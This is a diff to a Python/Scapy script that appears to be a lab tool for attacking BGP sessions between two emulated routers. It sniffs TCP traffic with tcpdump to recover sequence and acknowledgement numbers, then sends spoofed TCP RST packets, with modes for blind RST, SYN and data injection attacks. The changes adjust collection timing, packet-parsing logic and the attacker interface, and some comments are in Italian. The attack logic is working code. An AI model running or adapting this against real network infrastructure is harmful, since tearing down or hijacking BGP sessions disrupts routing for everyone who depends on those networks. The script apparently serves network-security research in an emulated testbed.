@@ -16,13 +16,15 @@ load_contrib("bgp")
 
 SOURCE_ADDRESS = '9.0.1.2'
 DESTINATION_ADDRESS = '9.0.1.1'
-BLIND_RST_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
+BLIND_RST_ATTACK_COLLECT_TIME = 15 * 4 # <keepalive> * 4
 BLIND_SYN_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
 BLIND_DATA_ATTACK_COLLECT_TIME = 45 + 15 * 2 # <hold-timer> + <keep-alive> * 2
 
 
 def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
 	log('Sending TCP RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
+
+	# attack with conf 1 or conf 2 acts in the same way
 
 	# conf 1
 	#tcp = TCP(flags="RA")
@@ -31,8 +33,6 @@ def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNu
 	# conf 2
 	tcp = TCP(flags="R")
 	tcp.ack=0
-
-	# conf 1 and conf 2 works in the same way
 
 	tcp.sport=int(srcPort)
 	tcp.dport=int(dstPort)
@@ -210,11 +210,6 @@ def analyze_third_row(row):
 
 	values = row.split(' ')
 
-	"""
-	for i, v in enumerate(values):
-		print '[', i, ']', v
-	"""
-
 	sys.stdout.flush()
 
 	return True, True, True, True, True, True, True
@@ -230,18 +225,10 @@ def choose_ports_and_numbers(srcIP, sa, da, sp, dp, a, s, w):
 
 
 def retrieve_ports_and_numbers(iface, srcIP, dstIP):
-	# TODO cercare un ack
+	# cerco un ack
 	# in base a src e a dst prelevi AN e SN
 	# e li usi per l'UPDATE BGP
 	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnS', 'not arp'), stdout=PIPE)
-
-	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
-
-	# find a TCP ACK
-	# process following 3 packets to get proper AN & SN
-	# first
-	# second
-	# third
 
 	phase = 0
 	row1 = None
@@ -254,11 +241,15 @@ def retrieve_ports_and_numbers(iface, srcIP, dstIP):
 		values = row.split(' ')
 
 		if phase == 1:
-			print row
 			rows.append(row)
 
 			if packet_is_ACK(row):
-				break
+				# avoiding processing 2 packets exchange
+				# e.g. KEEPALIVE; ACK;
+				if len(rows) < 3:
+					rows = list()
+				else:
+					break
 
 		if phase == 0:
 			if packet_is_ACK(row):
@@ -266,9 +257,13 @@ def retrieve_ports_and_numbers(iface, srcIP, dstIP):
 	
 	p.kill()
 
-	row1 = rows[-3]
-	row2 = rows[-2]
-	row3 = rows[-1]
+	if len(rows) > 2:
+		row1 = rows[-3]
+		row2 = rows[-2]
+		row3 = rows[-1]
+	else:
+		row1 = rows[-2]
+		row2 = rows[-1]
 
 	print row1
 	print row2
@@ -279,14 +274,12 @@ def retrieve_ports_and_numbers(iface, srcIP, dstIP):
 	sa2, da2, sp2, dp2, a2, s2, w2 = analyze_second_row(row2)
 	if sa2 == True:
 		print 'case 2'
-		print sa1, da1, sp1, dp1, a1, s1, w1
 
 		return choose_ports_and_numbers(srcIP, sa1, da1, sp1, dp1, a1, s1, w1)
 	
 	sa3, da3, sp3, dp3, a3, s3, w3 = analyze_third_row(row3)
 	if sa3 == True:
 		print 'case 3'
-		print sa2, da2, sp2, dp2, a2, s2, w2
 
 		return choose_ports_and_numbers(srcIP, sa2, da2, sp2, dp2, a2, s2, w2)
 
@@ -303,26 +296,46 @@ def main():
 
 	dst_mac_address = sys.argv[4]
 	print 'R2 destination MAC address', dst_mac_address
+	log('wait for the attacker to retrieve AN and SN', 'yellow')
 	print
 
 	sys.stdout.flush()
 
-	srcPort, dstPort, seqNum, ackNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
+	srcPort, dstPort, ackNum, seqNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
 	assert srcPort is not None
 	assert dstPort is not None
 	assert seqNum is not None
 	assert ackNum is not None
 	assert win is not None
-	print 'source port', srcPort
-	print 'destination port', dstPort
-	print 'sequence number', seqNum
-	print 'acknowledge number', ackNum
+	print 'src port', srcPort
+	print 'dst port', dstPort
+	print 'seq number', seqNum
+	print 'ack number', ackNum
 	print 'window', win
 	print
 
 	sys.stdout.flush()
 
-	iface = 'atk1-eth0'
+	"""
+	if choice == 2:
+		iface = 'atk1-eth0'
+	else:
+		# TEST: forcing reset on proper subnet
+		iface = 'atk1-eth1'
+		src_mac_address = 'aa:aa:aa:aa:aa:01'
+		dst_mac_address = '22:22:22:22:22:05'
+		# RESULT
+		# for blind syn attack
+		# result is the one expected, BGP session is truncated
+		# for blind data attack
+		# TODO
+	"""
+
+	# TODO understand if you have to use atk1-eth0 or atk1-eth1
+	iface = 'atk1-eth1'
+	src_mac_address = 'aa:aa:aa:aa:aa:01'
+	dst_mac_address = '22:22:22:22:22:05'
+
 	collect_time = 0
 
 	if choice == 1:
@@ -338,9 +351,6 @@ def main():
 	log2('packets collection', collect_time, 'red')
 	log('Packets collected', 'red')
 	log('Check pcap capture files', 'red')
-
-
-	# TODO controlla se l'attacco ha effetto
 
 
 if __name__ == "__main__":
